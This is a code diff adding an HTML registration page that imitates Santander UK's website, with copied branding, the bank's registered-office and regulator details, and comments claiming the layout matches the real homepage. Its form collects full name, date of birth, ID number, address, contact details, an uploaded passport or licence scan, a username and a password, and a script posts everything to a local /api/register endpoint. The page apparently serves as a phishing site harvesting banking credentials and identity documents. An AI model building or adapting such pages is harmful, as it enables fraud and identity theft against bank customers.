@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Santander | Register for Account Opening</title>
+  <meta name="description" content="Register for Santander Online Banking. It only takes a few minutes.">
+  <meta name="keywords" content="">
+
+  <!-- Favicons -->
+  <link href="" rel="icon">
+  <link href="" rel="apple-touch-icon">
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com" rel="preconnect">
+  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="vendor/aos/aos.css" rel="stylesheet">
+  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Main CSS File -->
+  <link href="css/main.css" rel="stylesheet">
+</head>
+
+<body class="index-page">
+
+  <!-- ========== HEADER (exactly as on Santander homepage) ========== -->
+  <header id="header" class="header d-flex align-items-center" style="background-color: red;">
+    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">
+      <i class="mobile-nav-toggle d-xl-none bi bi-list"></i>
+      <nav id="navmenu" class="navmenu">
+        <ul>
+          <li><a href="personal.html" class="active text-white">Personal</a></li>
+          <li><a href="private.html" class="text-white">Private</a></li>
+          <li><a href="business.html" class="text-white">Business</a></li>
+          <li><a href="corporate.html" class="text-white">Corporate</a></li>
+        </ul>
+      </nav>
+      <div class="ms-auto">
+        <a class="btn-getstarted" href="index.html">Home</a>
+        <a class="btn-getstarted" href="customer-support.html">Contact</a>
+        <a class="btn-getstarted bg-white" href="register.html" style="color: red;">Register</a>
+        <a class="btn-getstarted bg-white" href="login.html" style="color: red;">Login</a>
+      </div>
+    </div>
+  </header>
+
+  <header id="header" class="header align-items-center">
+    <div class="container-fluid container-xl position-relative d-flex align-items-center">
+      <a href="index.html" class="logo d-flex align-items-center me-auto">
+        <img src="img/logo.png" alt="Santander logo" class="img-fluid">
+        <h4 class="pt-3 fw-bold" style="color: red;">Santander</h4>
+      </a>
+      <nav id="navmenu" class="navmenu">
+        <!-- empty on purpose – matches the homepage structure -->
+      </nav>
+    </div>
+  </header>
+  <!-- ========== END HEADER ========== -->
+
+  <main class="main">
+    <!-- Registration Form Section (adapted from Barclays example) -->
+    <section class="register-section py-5">
+      <div class="container">
+        <h1 class="mb-4" data-aos="fade-up"><strong>Register for Account Opening</strong></h1>
+        <p class="lead mb-4" data-aos="fade-up" data-aos-delay="100">It only takes a few minutes</p>
+
+        <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="200">
+          <div class="col-md-8 col-lg-7">
+            <div class="card shadow border-0 rounded-4">
+              <div class="card-body p-5">
+                <div class="text-center mb-4">
+                  <h3 class="fw-bold">Create Account</h3>
+                  <p class="text-muted">Fill in your valid details below</p>
+                </div>
+
+                <form>
+                  <!-- Personal Details -->
+                  <h5 class="mb-3 text-secondary fs-6 text-uppercase">Personal Details</h5>
+                  <div class="row g-2 mb-3">
+                    <div class="col-md-4">
+                      <div class="form-floating">
+                        <input type="text" class="form-control" id="Firstname" placeholder="Firstname">
+                        <label for="Firstname">First Name</label>
+                      </div>
+                    </div>
+                    <div class="col-md-4">
+                      <div class="form-floating">
+                        <input type="text" class="form-control" id="Middlename" placeholder="Middle name">
+                        <label for="Middlename">Middle Name</label>
+                      </div>
+                    </div>
+                    <div class="col-md-4">
+                      <div class="form-floating">
+                        <input type="text" class="form-control" id="Surname" placeholder="Surname">
+                        <label for="Surname">Surname</label>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="row g-2 mb-3">
+                    <div class="col-md-6">
+                      <div class="form-floating">
+                        <input type="text" class="form-control" id="dob" placeholder="Date of birth">
+                        <label for="dob">Date of Birth</label>
+                      </div>
+                    </div>
+                    <div class="col-md-6">
+                      <div class="form-floating">
+                        <input type="text" class="form-control" id="id" placeholder="ID number">
+                        <label for="id">ID Number</label>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="form-floating mb-3">
+                    <input type="text" class="form-control" id="address" placeholder="Residential address">
+                    <label for="address">Residential Address</label>
+                  </div>
+
+                  <div class="row g-2 mb-3">
+                    <div class="col-md-6">
+                      <div class="form-floating">
+                        <input type="email" class="form-control" id="Email" placeholder="Email">
+                        <label for="Email">Email Address</label>
+                      </div>
+                    </div>
+                    <div class="col-md-6">
+                      <div class="form-floating">
+                        <input type="text" class="form-control" id="phone" placeholder="Phone">
+                        <label for="phone">Phone Number</label>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Account & Identification -->
+                  <h5 class="mb-3 text-secondary fs-6 text-uppercase mt-4">Account & Identification</h5>
+
+                  <div class="mb-3">
+                    <label class="form-label text-muted small">Select Account Type(s)</label>
+                    <div>
+                        <div class="form-check form-check-inline">
+                            <input class="form-check-input" type="checkbox" id="accCurrent" value="current">
+                            <label class="form-check-label" for="accCurrent">Current</label>
+                        </div>
+                        <div class="form-check form-check-inline">
+                            <input class="form-check-input" type="checkbox" id="accSavings" value="savings">
+                            <label class="form-check-label" for="accSavings">Savings</label>
+                        </div>
+                        <div class="form-check form-check-inline">
+                            <input class="form-check-input" type="checkbox" id="accBusiness" value="business">
+                            <label class="form-check-label" for="accBusiness">Business</label>
+                        </div>
+                         <div class="form-check form-check-inline">
+                            <input class="form-check-input" type="checkbox" id="accISA" value="isa">
+                            <label class="form-check-label" for="accISA">ISA</label>
+                        </div>
+                    </div>
+                  </div>
+
+                  <div class="mb-3">
+                    <label for="idDocument" class="form-label text-muted small">Upload Identification (Passport, Driver's License, ID Card)</label>
+                    <input class="form-control" type="file" id="idDocument" accept=".jpg,.jpeg,.png,.pdf">
+                  </div>
+
+                  <!-- Security Details -->
+                  <h5 class="mb-3 text-secondary fs-6 text-uppercase mt-4">Security</h5>
+                  <div class="form-floating mb-3">
+                    <input type="text" class="form-control" id="username" placeholder="Username">
+                    <label for="username">Username</label>
+                  </div>
+
+                  <div class="row g-2 mb-4">
+                    <div class="col-md-6">
+                      <div class="form-floating">
+                        <input type="password" class="form-control" id="Password" placeholder="Password">
+                        <label for="Password">Password</label>
+                      </div>
+                    </div>
+                    <div class="col-md-6">
+                      <div class="form-floating">
+                        <input type="password" class="form-control" id="ConfirmPassword" placeholder="Confirm Password">
+                        <label for="ConfirmPassword">Confirm Password</label>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Submit Button -->
+                  <div class="d-grid">
+                    <button type="button" class="btn btn-danger rounded-pill py-2 fw-bold" onclick="submitRegistration()">Create Account</button>
+                  </div>
+                </form>
+
+                <div class="text-center mt-4">
+                  <p class="small text-muted">Already have an account? <a href="login.html" class="text-decoration-none text-danger">Login here</a></p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Two info boxes (exactly as on Santander homepage) -->
+    <hr class="my-5" />
+    <div class="container mt-5">
+      <div class="row">
+        <div class="col-6">
+          <div class="p-3 border bg-light">
+            <h5>Protecting your money</h5>
+            <p>Your business is protected by the Financial Services Compensation Scheme (FSCS) up to £85,000.</p>
+          </div>
+        </div>
+        <div class="col-6">
+          <div class="p-3 border bg-light">
+            <h5>Stop, Challenge, Protect</h5>
+            <p>Stay safe from fraud – we'll never ask for your full PIN or password. If something feels wrong, stop and challenge it.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- ========== FOOTER (exactly as on Santander homepage) ========== -->
+  <footer class="text-center text-dark">
+    <div class="container">
+      <section class="mt-5">
+        <div class="row text-center d-flex justify-content-center pt-5">
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">About Santander UK</a></h6></div>
+          <div class="col-md-1"><h6><a href="#!" class="text-dark">Branch locator</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Branch appointments</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Support</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Accessibility</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Site map</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Privacy policy</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Cookie policy</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Fraud and security</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Financial results</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Santander Careers</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Service status</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Welsh language policy</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Modern slavery statement</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Santander Universities</a></h6></div>
+          <div class="col-md-2"><h6><a href="#!" class="text-dark">Santander websites</a></h6></div>
+        </div>
+      </section>
+
+      <section class="mb-5">
+        <div class="row d-flex justify-content-start">
+          <div class="col-lg-12">
+            <p class="small">
+              Santander UK plc. Registered Office: 2 Triton Square, Regent's Place, London, NW1 3AN, United Kingdom. Registered Number 2294747. Registered in England and Wales. www.santander.co.uk. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. Our Financial Services Register number is 106054. You can check this on the Financial Services Register by visiting the FCA’s website www.fca.org.uk/register. Santander and the flame logo are registered trademarks.
+            </p>
+          </div>
+        </div>
+      </section>
+    </div>
+  </footer>
+  <!-- ========== END FOOTER ========== -->
+
+  <!-- Scroll Top -->
+  <a href="#" id="scroll-top" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Preloader -->
+  <div id="preloader"></div>
+
+  <!-- Vendor JS Files -->
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="vendor/php-email-form/validate.js"></script>
+  <script src="vendor/aos/aos.js"></script>
+  <script src="vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="vendor/imagesloaded/imagesloaded.pkgd.min.js"></script>
+  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="vendor/swiper/swiper-bundle.min.js"></script>
+
+  <!-- Main JS File -->
+  <script src="js/main.js"></script>
+
+  <!-- Optional: initialise AOS (already in main.js, but safe to call) -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      AOS.init();
+    });
+
+    async function submitRegistration() {
+        const formData = new FormData();
+        
+        // Gather text fields
+        formData.append('firstname', document.getElementById('Firstname').value);
+        formData.append('middlename', document.getElementById('Middlename').value);
+        formData.append('surname', document.getElementById('Surname').value);
+        formData.append('dob', document.getElementById('dob').value);
+        formData.append('id_number', document.getElementById('id').value);
+        formData.append('address', document.getElementById('address').value);
+        formData.append('email', document.getElementById('Email').value);
+        formData.append('phone', document.getElementById('phone').value);
+        formData.append('username', document.getElementById('username').value);
+        formData.append('password', document.getElementById('Password').value);
+        
+        // Gather checkboxes
+        const accountTypes = [];
+        if(document.getElementById('accCurrent').checked) accountTypes.push('Current');
+        if(document.getElementById('accSavings').checked) accountTypes.push('Savings');
+        if(document.getElementById('accBusiness').checked) accountTypes.push('Business');
+        if(document.getElementById('accISA').checked) accountTypes.push('ISA');
+        formData.append('account_types', accountTypes.join(', '));
+
+        // Gather file
+        const fileInput = document.getElementById('idDocument');
+        if(fileInput.files.length > 0) {
+            formData.append('idDocument', fileInput.files[0]);
+        }
+
+        // Validation (basic)
+        if(document.getElementById('Password').value !== document.getElementById('ConfirmPassword').value) {
+            alert("Passwords do not match!");
+            return;
+        }
+
+        try {
+            const response = await fetch('/api/register', {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            if(result.success) {
+                window.location.href = 'application-under-review.html';
+            } else {
+                alert('Registration failed: ' + result.message);
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('An error occurred during registration.');
+        }
+    }
+  </script>
+</body>
+</html>
